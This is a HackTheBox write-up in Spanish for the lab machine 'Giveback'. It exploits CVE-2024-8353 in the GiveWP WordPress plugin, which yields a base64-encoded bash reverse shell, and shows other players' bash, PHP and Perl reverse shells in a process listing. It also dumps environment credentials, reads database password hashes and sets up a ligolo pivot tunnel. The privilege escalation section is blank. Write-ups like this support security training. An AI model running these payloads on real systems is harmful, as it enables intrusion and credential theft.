# HTB: Giveback

## Host: Linux
## IP: 10.10.11.94

## Procedimiento y comandos
#### Paso 1: Enumeracion

Encontramos un sitio wordpres con un pluging **GiveWP** al cual la maquina hace referencia.

Buscamos por CVE y Exploits

[CVE](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)

[Exploit](https://github.com/EQSTLab/CVE-2024-8353)





#### Paso 2: Acceso inicial

* Ejecutamos la prueba de concepto

```bash
python3 CVE-2024-8353.py -u http://giveback.htb -c "ping 10.10.15.196"
                                                                                                                                                                                                                                                                                                            
Analysis base : https://github.com/EQSTLab/CVE-2024-8353

=============================================================================================================    

CVE-2024-8353 : GiveWP unauthenticated PHP Object Injection
description: Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.16.1 via deserialization of untrusted input via several parameters like 'give_title' and 'card_address'. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to delete arbitrary files and achieve remote code execution. This is essentially the same vulnerability as CVE-2024-5932, however, it was discovered the the presence of stripslashes_deep on user_info allows the is_serialized check to be bypassed. This issue was mostly patched in 3.16.1, but further hardening was added in 3.16.2.

============================================================================================================= 
    
[\] Exploit loading, please wait...
[+] Donation Forms:
    17: The Things We Need
[+] Choose one (id) >>> 

```

* Vemos en tcpdump

```bash
tcpdump -i tun1 tcp    
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes
18:58:40.791024 IP 10.10.15.196.49342 > giveback.htb.http: Flags [S], seq 305648394, win 64240, options [mss 1460,sackOK,TS val 2405710537 ecr 0,nop,wscale 7], length 0
18:58:41.789110 IP giveback.htb.http > 10.10.15.196.49342: Flags [S.], seq 1099946561, ack 305648395, win 64308, options [mss 1362,sackOK,TS val 3644043431 ecr 2405710537,nop,wscale 7], length 0
18:58:41.789162 IP 10.10.15.196.49342 > giveback.htb.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2405711535 ecr 3644043431], length 0
18:58:41.789325 IP 10.10.15.196.49342 > giveback.htb.http: Flags [P.], seq 1:237, ack 1, win 502, options [nop,nop,TS val 2405711535 ecr 3644043431], length 236: HTTP: POST /wp-admin/admin-ajax.php HTTP/1.1
18:58:41.789367 IP 10.10.15.196.49342 > giveback.htb.http: Flags [P.], seq 237:260, ack 1, win 502, options [nop,nop,TS val 2405711535 ecr 3644043431], length 23: HTTP
18:58:42.095973 IP giveback.htb.http > 10.10.15.196.49342: Flags [.], ack 237, win 501, options [nop,nop,TS val 3644043679 ecr 2405711535], length 0
18:58:42.096018 IP giveback.htb.http > 10.10.15.196.49342: Flags [.], ack 260, win 501, options [nop,nop,TS val 3644043679 ecr 2405711535], length 0
18:58:43.427214 IP giveback.htb.http > 10.10.15.196.49342: Flags [P.], seq 1:456, ack 260, win 501, options [nop,nop,TS val 3644045050 ecr 2405711535], length 455: HTTP: HTTP/1.1 200 OK
18:58:43.427255 IP 10.10.15.196.49342 > giveback.htb.http: Flags [.], ack 456, win 501, options [nop,nop,TS val 2405713173 ecr 3644045050], length 0
18:59:58.486511 IP giveback.htb.http > 10.10.15.196.49342: Flags [F.], seq 456, ack 260, win 501, options [nop,nop,TS val 3644120050 ecr 2405713173], length 0
18:59:58.529084 IP 10.10.15.196.49342 > giveback.htb.http: Flags [.], ack 457, win 501, options [nop,nop,TS val 2405788275 ecr 3644120050], length 0
```

* Ejecutamos penelope y obtenemos un shell

**Payload**

```bash
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTk2LzQ0NDQgMD4mMSkgJg==|base64 -d|bash
```

**Ejecucion**

```bash
python3 CVE-2024-8353.py -u http://giveback.htb -c "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTk2LzQ0NDQgMD4mMSkgJg==|base64 -d|bash"
```

**shell**

```bash
[+] Got reverse shell from beta-vino-wp-wordpress-565c644444-d5p8j~10.10.11.94-Linux-x86_64 üòç Assigned SessionID <1>
```
```bash
(Penelope)‚îÄ(Session [1])> interact 1
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /root/.penelope/sessions/beta-vino-wp-wordpress-565c644444-d5p8j~10.10.11.94-Linux-x86_64/2025_11_06-19_03_08-759.log üìú
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
whoami
whoami: cannot find name for user ID 1001
I have no name!@beta-vino-wp-wordpress-565c644444-d5p8j:/opt/bitnami/wordpress/wp-admin$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
I have no name!@beta-vino-wp-wordpress-565c644444-d5p8j:/opt/bitnami/wordpress/wp-admin$ 
```

* env

```bash
SHELL=/usr/bin/bash
KUBERNETES_SERVICE_PORT_HTTPS=443
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
WORDPRESS_SMTP_PASSWORD=
WORDPRESS_SMTP_FROM_EMAIL=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
WEB_SERVER_HTTP_PORT_NUMBER=8080
WORDPRESS_RESET_DATA_PERMISSIONS=no
KUBERNETES_SERVICE_PORT=443
WORDPRESS_EMAIL=user@example.com
WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
MARIADB_PORT_NUMBER=3306
MODULE=wordpress
WORDPRESS_SMTP_FROM_NAME=FirstName LastName
HOSTNAME=beta-vino-wp-wordpress-565c644444-d5p8j
WORDPRESS_SMTP_PORT_NUMBER=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WORDPRESS_EXTRA_CLI_ARGS=
APACHE_BASE_DIR=/opt/bitnami/apache
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts
WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
WORDPRESS_ENABLE_DATABASE_SSL=no
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
APACHE_DAEMON_USER=daemon
BITNAMI_ROOT_DIR=/opt/bitnami
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WORDPRESS_BASE_DIR=/opt/bitnami/wordpress
WORDPRESS_SCHEME=http
WORDPRESS_LOGGED_IN_SALT=
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content
WORDPRESS_HTACCESS_OVERRIDE_NONE=no
WORDPRESS_DATABASE_SSL_CERT_FILE=
APACHE_HTTPS_PORT_NUMBER=8443
PWD=/opt/bitnami/apache/conf
OS_FLAVOUR=debian-12
WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php
WORDPRESS_SMTP_PROTOCOL=
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
WP_CLI_BASE_DIR=/opt/bitnami/wp-cli
WORDPRESS_VOLUME_DIR=/bitnami/wordpress
WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
APACHE_BIN_DIR=/opt/bitnami/apache/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WORDPRESS_PLUGINS=none
WORDPRESS_FIRST_NAME=FirstName
MARIADB_HOST=beta-vino-wp-mariadb
WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
WORDPRESS_DATABASE_USER=bn_wordpress
PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M
WORDPRESS_AUTH_KEY=
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain
WORDPRESS_DATABASE_SSL_KEY_FILE=
APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default
WORDPRESS_LOGGED_IN_KEY=
APACHE_CONF_DIR=/opt/bitnami/apache/conf
HOME=/
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
WEB_SERVER_DAEMON_GROUP=daemon
PHP_DEFAULT_POST_MAX_SIZE=80M
WORDPRESS_ENABLE_HTTPS=no
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
WORDPRESS_TABLE_PREFIX=wp_
WORDPRESS_DATABASE_PORT_NUMBER=3306
WORDPRESS_DATABASE_NAME=bitnami_wordpress
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
APACHE_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
APACHE_DEFAULT_HTTP_PORT_NUMBER=8080
WP_CLI_DAEMON_GROUP=daemon
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
WORDPRESS_AUTO_UPDATE_LEVEL=none
BITNAMI_DEBUG=false
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
WORDPRESS_USERNAME=user
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
WORDPRESS_ENABLE_XML_RPC=no
WORDPRESS_BLOG_NAME=User's Blog!
APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
WORDPRESS_AUTH_SALT=
APACHE_LOGS_DIR=/opt/bitnami/apache/logs
WORDPRESS_EXTRA_INSTALL_ARGS=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
APACHE_DAEMON_GROUP=daemon
WORDPRESS_NONCE_KEY=
WEB_SERVER_HTTPS_PORT_NUMBER=8443
WORDPRESS_SMTP_HOST=
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
TERM=xterm-256color
APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443
WORDPRESS_NONCE_SALT=
APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf
WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443
WORDPRESS_LAST_NAME=LastName
WP_NGINX_SERVICE_SERVICE_PORT=80
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
WORDPRESS_ENABLE_MULTISITE=no
WORDPRESS_SKIP_BOOTSTRAP=no
WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443
SHLVL=2
WORDPRESS_SECURE_AUTH_SALT=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BITNAMI_VOLUME_DIR=/bitnami
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
KUBERNETES_PORT_443_TCP_PROTO=tcp
BITNAMI_APP_NAME=wordpress
# Credencial Base de datos!
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS 
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
WEB_SERVER_GROUP=daemon
# Password wordpress
WORDPRESS_PASSWORD=O8F7KR5zGi
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
WORDPRESS_SECURE_AUTH_KEY=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
APACHE_TMP_DIR=/opt/bitnami/apache/var/run
APP_VERSION=6.8.1
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
ALLOW_EMPTY_PASSWORD=yes
WP_CLI_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
WORDPRESS_VERIFY_DATABASE_SSL=yes
OS_NAME=linux
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/wp-cli/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_SERVER_TOKENS=Prod
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no
WORDPRESS_ENABLE_REVERSE_PROXY=no
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
OS_ARCH=amd64
WEB_SERVER_DAEMON_USER=daemon
OLDPWD=/opt/bitnami/wordpress/wp-admin
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
_=/usr/bin/env
```
Parece ser que estamos en un pod Kubernetes

```bash
I have no name!@beta-vino-wp-wordpress-565c644444-d5p8j:/opt/bitnami/apache/conf$ ps -ef --forest
UID          PID    PPID  C STIME TTY          TIME CMD
1001           1       0  0 20:23 ?        00:00:02 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001         261       1  0 20:23 ?        00:00:03 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001        8710     261  0 20:36 ?        00:00:00  \_ sh -c bash -c 'bash -i >& /dev/tcp/10.10.15.192/9001 0>&1'
1001        8711    8710  0 20:36 ?        00:00:00      \_ bash -c bash -i >& /dev/tcp/10.10.15.192/9001 0>&1
1001        8712    8711  0 20:36 ?        00:00:00          \_ bash -i
1001        8723    8712  0 20:36 ?        00:00:00              \_ script /dev/null -c /bin/bash
1001        8724    8723  0 20:36 pts/1    00:00:00                  \_ sh -c /bin/bash
1001        8725    8724  0 20:36 pts/1    00:00:00                      \_ /bin/bash
1001       23457    8725  0 21:26 pts/1    00:00:01                          \_ /tmp/ligolo-agent -connect 10.10.15.192:11601 -ignore-cert
1001       31964    8725  0 22:01 pts/1    00:00:00                          \_ /tmp/ligolo-agent -connect 10.10.15.192:11601 -ignore-cert
1001        3128       1  0 20:30 ?        00:00:00 sh -c /bin/bash <&3 >&3 2>&3
1001        3130    3128  0 20:30 ?        00:00:00  \_ /bin/bash
1001        4075    3130  0 20:30 ?        00:00:00      \_ /usr/bin/script -qc /bin/bash /dev/null
1001        4076    4075  0 20:30 pts/0    00:00:00          \_ sh -c /bin/bash
1001        4077    4076  0 20:30 pts/0    00:00:00              \_ /bin/bash
1001        4471    4077  0 20:31 pts/0    00:00:00                  \_ bash
1001        4602    4471  0 20:31 pts/0    00:00:00                      \_ sh
1001        5126    4602  0 20:31 pts/0    00:00:00                          \_ bash
1001        5919       1  0 20:32 ?        00:00:05 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001        9379       1  0 20:46 ?        00:00:04 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001        9795    9379  0 20:47 ?        00:00:00  \_ sh -c echo "cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEwLjE1LjE1MSIsNDU0NSk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA+JjMgMj4mMyIpOyc="| base64 -d | bash
1001        9798    9795  0 20:47 ?        00:00:00      \_ bash
1001        9799    9798  0 20:47 ?        00:00:00          \_ php -r $sock=fsockopen("10.10.15.151",4545);exec("/bin/bash <&3 >&3 2>&3");
1001        9800    9799  0 20:47 ?        00:00:00              \_ sh -c /bin/bash <&3 >&3 2>&3
1001        9801    9800  0 20:47 ?        00:00:00                  \_ /bin/bash
1001        9855    9801  0 20:48 ?        00:00:00                      \_ /usr/bin/script -qc /bin/bash /dev/null
1001        9856    9855  0 20:48 pts/2    00:00:00                          \_ sh -c /bin/bash
1001        9857    9856  0 20:48 pts/2    00:00:00                              \_ /bin/bash
1001      131529    9857  0 22:35 pts/2    00:00:02                                  \_ ./agent --ignore-cert -connect 10.10.15.151:11601
1001       23416       1  0 21:22 ?        00:00:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       23420   23416  0 21:22 ?        00:00:00  \_ sh -c bash -c 'bash -i >& /dev/tcp/10.10.14.250/1235 0>&1'
1001       23421   23420  0 21:22 ?        00:00:00      \_ bash -c bash -i >& /dev/tcp/10.10.14.250/1235 0>&1
1001       23422   23421  0 21:22 ?        00:00:00          \_ bash -i
1001       31779       1  0 21:57 ?        00:00:05 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       49801       1  0 22:03 ?        00:00:00 bash
1001       58101   49801  0 22:03 ?        00:00:00  \_ /usr/bin/script -q /dev/null
1001       58103   58101  0 22:03 pts/6    00:00:00      \_ bash -i
1001       49909       1  0 22:03 ?        00:00:00 bash
1001      131562   49909  0 22:40 ?        00:00:00  \_ /usr/bin/script -q /dev/null
1001      131563  131562  0 22:40 pts/3    00:00:00      \_ bash -i
1001       50006       1  0 22:03 ?        00:00:00 bash
1001      131633   50006  0 22:52 ?        00:00:00  \_ /usr/bin/script -q /dev/null
1001      131634  131633  0 22:52 pts/4    00:00:00      \_ bash -i
1001       50149       1  0 22:03 ?        00:00:00 bash
1001      131651   50149  0 22:53 ?        00:00:00  \_ /usr/bin/script -q /dev/null
1001      131652  131651  0 22:53 pts/5    00:00:00      \_ bash -i
1001      131868  131652 99 23:20 pts/5    00:00:00          \_ ps -ef --forest
1001       50289       1  0 22:03 ?        00:00:00 bash
1001       50364       1  0 22:03 ?        00:00:00 bash
1001       50495       1  0 22:03 ?        00:00:00 bash
1001       50599       1  0 22:03 ?        00:00:00 bash
1001       50632       1  0 22:03 ?        00:00:00 bash
1001       50710       1  0 22:03 ?        00:00:00 bash
1001      125424       1  0 22:18 ?        00:00:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && ec
1001      125425  125424  0 22:18 ?        00:00:00  \_ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 &
1001      125427  125425  0 22:18 ?        00:00:00  |   \_ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/
1001      125430  125427  0 22:18 ?        00:00:00  |       \_ dd bs=9000 count=1
1001      125426  125424  0 22:18 ?        00:00:00  \_ grep accessible
1001      131426       1  0 22:28 ?        00:00:02 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001      131471  131426  0 22:31 ?        00:00:00  \_ sh -c perl -e 'use Socket;$i="10.10.14.144";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,"
1001      131472  131471  0 22:31 ?        00:00:00      \_ /bin/bash -i
1001      131583  131472  2 22:43 ?        00:01:04          \_ ./ligolo -connect 10.10.14.144:11601 -accept-fingerprint AE1EB19F5DD40F52B68A0BE1E43D84DD9ADAC1D91B446A88166B992B4AF53418
1001      131852       1  0 23:18 ?        00:00:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001      131853       1  0 23:18 ?        00:00:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001      131860       1  0 23:18 ?        00:00:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
```

Aparentemente el contenedor est√° actuando como punto de pivot dentro de la red interna del cluster Kubernetes.

```bash
echo > /dev/tcp/10.43.147.82/3306 && echo "‚úÖ puerto 3306 abierto" || echo "‚ùå sin acceso"
# devuelve
‚úÖ puerto 3306 abierto
```

```bash
I have no name!@beta-vino-wp-wordpress-565c644444-d5p8j:/tmp$ which mysql || /opt/bitnami/mysql/bin/mysql --version 2>/dev/null || echo "mysql no encontrado"
/opt/bitnami/mysql/bin/mysql
I have no name!@beta-vino-wp-wordpress-565c644444-d5p8j:/tmp$ /opt/bitnami/mysql/bin/mysql -h 10.43.147.82 -u bn_wordpress -psW5sp4spa3u7RLyetrekE4oS -D bitnami_wordpress -e "SELECT ID,user_login,user_pass FROM wp_users LIMIT 100;"
/opt/bitnami/mysql/bin/mysql: Deprecated program name. It will be removed in a future release, use '/opt/bitnami/mysql/bin/mariadb' instead
+----+------------+-----------------------------------------------------------------+
| ID | user_login | user_pass                                                       |
+----+------------+-----------------------------------------------------------------+
|  1 | user       | $wp$2y$10$JdfYmrlB2AyklXkbmkofHuqRcCI3FPUrBQHpjg7wSK90tqmt3t7k2 |
+----+------------+-----------------------------------------------------------------+
```

Podemos seguir este rastro y levantar un tunnel para conectarnos a la base de datos del cluster por ligolo

* Proxy

```bash
 ligolo-proxy -selfcert -laddr 0.0.0.0:11601 -v                                                                                         

ligolo-ng ¬ª INFO[0125]/build/ligolo-ng-d95Z4N/ligolo-ng-0.8.2/cmd/proxy/main.go:157 main.main.func3() Agent joined.                                 id=964343123e19 name=Unknown@beta-vino-wp-wordpress-565c644444-d5p8j remote="10.10.11.94:4101"
ligolo-ng ¬ª session
? Specify a session : 1 - Unknown@beta-vino-wp-wordpress-565c644444-d5p8j - 10.10.11.94:4101 - 964343123e19
[Agent : Unknown@beta-vino-wp-wordpress-565c644444-d5p8j] ¬ª autoroute
? Select routes to add: 10.42.1.181/24
? Create a new interface or use an existing one? Create a new interface
INFO[0163]/build/ligolo-ng-d95Z4N/ligolo-ng-0.8.2/cmd/proxy/app/interfaces.go:317 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Generating a random interface name...        
INFO[0163]/build/ligolo-ng-d95Z4N/ligolo-ng-0.8.2/cmd/proxy/app/interfaces.go:325 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Using interface name magicalwitchfir         
INFO[0163]/build/ligolo-ng-d95Z4N/ligolo-ng-0.8.2/cmd/proxy/app/interfaces.go:345 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func11() Creating routes for magicalwitchfir...       
? Start the tunnel? Yes
DEBU[0165]/build/ligolo-ng-d95Z4N/ligolo-ng-0.8.2/cmd/proxy/app/app.go:141 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel() Creating tun interface magicalwitchfir       
INFO[0165]/build/ligolo-ng-d95Z4N/ligolo-ng-0.8.2/cmd/proxy/app/app.go:148 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel() Starting tunnel to Unknown@beta-vino-wp-wordpress-565c644444-d5p8j (964343123e19) 
DEBU[0165]/build/ligolo-ng-d95Z4N/ligolo-ng-0.8.2/cmd/proxy/app/app.go:160 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel() Creating route magicalwitchfir on interface 10.42.1.181/24 
[Agent : Unknown@beta-vino-wp-wordpress-565c644444-d5p8j] ¬ª  
```

* agente

```bash
I have no name!@beta-vino-wp-wordpress-565c644444-d5p8j:/tmp$ ./ligolo-agent -connect 10.10.15.196:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.15.196:11601"
```

* Credenciales obtenidas del env:

```bash
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS 
WORDPRESS_PASSWORD=O8F7KR5zGi
```

```bash
WORDPRESS_DATABASE_USER=bn_wordpress
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
WORDPRESS_DATABASE_NAME=bitnami_wordpress
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
```

#### Paso 3: Privilege Escalation



